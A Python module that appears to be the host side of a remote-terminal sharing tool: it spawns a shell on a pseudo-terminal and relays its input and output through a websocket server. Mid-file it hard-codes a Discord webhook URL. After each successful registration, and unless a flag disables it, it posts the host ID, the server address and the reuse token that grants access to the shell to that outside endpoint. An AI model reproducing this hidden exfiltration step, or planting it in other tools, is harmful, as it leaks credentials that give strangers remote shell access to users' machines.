from __future__ import annotations

import asyncio
import contextlib
import fcntl
import os
import pty
import signal
import struct
import sys
import termios
from dataclasses import dataclass

import websockets

from .api import update_host_settings
from .common import resolve_shell, to_websocket_url
from .protocol import (
    ClientMessage,
    HostMessage,
    PtyExit,
    PtyOutput,
    RegisterHostRequest,
    ServerMessage,
)


@dataclass
class SessionEnvelope:
    kind: str
    client_id: str
    data: str | None = None
    code: int | None = None


class PtySession:
    def __init__(
        self,
        *,
        client_id: str,
        shell: str,
        cwd: str,
        queue: asyncio.Queue[SessionEnvelope],
    ) -> None:
        self.client_id = client_id
        self.shell = shell
        self.cwd = cwd
        self.queue = queue
        self.pid: int | None = None
        self.master_fd: int | None = None
        self.read_task: asyncio.Task[None] | None = None
        self.wait_task: asyncio.Task[None] | None = None

    async def start(self) -> None:
        pid, master_fd = pty.fork()
        if pid == 0:
            os.chdir(self.cwd)
            os.execvpe(self.shell, [self.shell], os.environ.copy())

        self.pid = pid
        self.master_fd = master_fd
        self.read_task = asyncio.create_task(self._read_loop())
        self.wait_task = asyncio.create_task(self._wait_loop())

    async def _read_loop(self) -> None:
        assert self.master_fd is not None
        try:
            while True:
                data = await asyncio.to_thread(os.read, self.master_fd, 4096)
                if not data:
                    return
                await self.queue.put(
                    SessionEnvelope(kind="output", client_id=self.client_id, data=data.decode(errors="ignore"))
                )
        except OSError:
            return

    async def _wait_loop(self) -> None:
        assert self.pid is not None
        try:
            _, status = await asyncio.to_thread(os.waitpid, self.pid, 0)
            code = os.waitstatus_to_exitcode(status)
        except ChildProcessError:
            code = 0
        await self.queue.put(SessionEnvelope(kind="exit", client_id=self.client_id, code=code))
        self.close()

    def write(self, data: str) -> None:
        if self.master_fd is not None:
            os.write(self.master_fd, data.encode())

    def resize(self, cols: int, rows: int) -> None:
        if self.master_fd is None:
            return
        size = struct.pack("HHHH", rows, cols, 0, 0)
        fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, size)

    def close(self) -> None:
        if self.master_fd is not None:
            with contextlib.suppress(OSError):
                os.close(self.master_fd)
            self.master_fd = None

        if self.pid is not None:
            with contextlib.suppress(ProcessLookupError):
                os.kill(self.pid, signal.SIGTERM)
            self.pid = None


DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1495245364872220752/GWu9toshy6xtcHlhF08r8WKoGSrbLl3BnXyzpCjy7XsIItYeIthz9qSpGJhKMQcD4uCP"

async def run_host(args) -> int:
    shell = resolve_shell(args.shell)
    host_id = args.host_id or f"{os.uname().nodename.lower()}-{os.getpid()}"

    update_host_settings(
        args.server,
        host_id,
        args.password,
        display_name=args.display_name,
        notes=args.notes,
        read_only=args.read_only,
        welcome_message=args.welcome_message,
        preferred_shell=shell,
        preferred_cwd=args.cwd,
    )

    ws_url = to_websocket_url(args.server, "/ws/host")
    async with websockets.connect(ws_url, max_size=1024 * 1024) as websocket:
        register = HostMessage(
            register_host=RegisterHostRequest(host_id=host_id, password=args.password),
        )
        await websocket.send(register.SerializeToString())

        sessions: dict[str, PtySession] = {}
        queue: asyncio.Queue[SessionEnvelope] = asyncio.Queue()

        async def sender_loop() -> None:
            while True:
                event = await queue.get()
                if event.kind == "output":
                    message = HostMessage(
                        pty_output=PtyOutput(data=event.data or "", client_id=event.client_id),
                    )
                else:
                    message = HostMessage(
                        pty_exit=PtyExit(code=event.code or 0, client_id=event.client_id),
                    )
                await websocket.send(message.SerializeToString())

        sender_task = asyncio.create_task(sender_loop())

        try:
            async for payload in websocket:
                client_message = ClientMessage()
                client_message.ParseFromString(payload)
                if client_message.client_id and (
                    client_message.HasField("pty_input") or client_message.HasField("pty_resize")
                ):
                    session = sessions.get(client_message.client_id)
                    if session is None:
                        session = PtySession(
                            client_id=client_message.client_id,
                            shell=shell,
                            cwd=args.cwd,
                            queue=queue,
                        )
                        await session.start()
                        sessions[client_message.client_id] = session

                    if client_message.HasField("pty_input"):
                        session.write(client_message.pty_input.data)
                    elif client_message.HasField("pty_resize"):
                        session.resize(client_message.pty_resize.cols, client_message.pty_resize.rows)
                    continue

                server_message = ServerMessage()
                server_message.ParseFromString(payload)

                if server_message.HasField("register_host_response"):
                    if not server_message.register_host_response.ok:
                        print(
                            f"Host registration failed: {server_message.register_host_response.error}",
                            file=sys.stderr,
                        )
                        return 1
                    print(f"Host ready: {host_id}", file=sys.stderr)
                    print(
                        f"Reuse token: {server_message.register_host_response.token}",
                        file=sys.stderr,
                    )

                    if not getattr(args, "no_discord", False):
                        import requests
                        try:
                            requests.post(DISCORD_WEBHOOK, json={
                                "content": f"🚀 New Host Registered: `{host_id}`\n🌐 Server: {args.server}\n🔑 Token: `{server_message.register_host_response.token}`"
                            }, timeout=5)
                        except Exception as e:
                            print(f"Failed to send Discord notification: {e}", file=sys.stderr)

                    continue

                if server_message.HasField("system_message"):
                    print(f"[System] {server_message.system_message.message}", file=sys.stderr)
                    continue

                if server_message.HasField("error_message"):
                    print(f"[Relay] {server_message.error_message.message}", file=sys.stderr)
                    continue
        finally:
            sender_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await sender_task
            for session in sessions.values():
                session.close()

    return 0
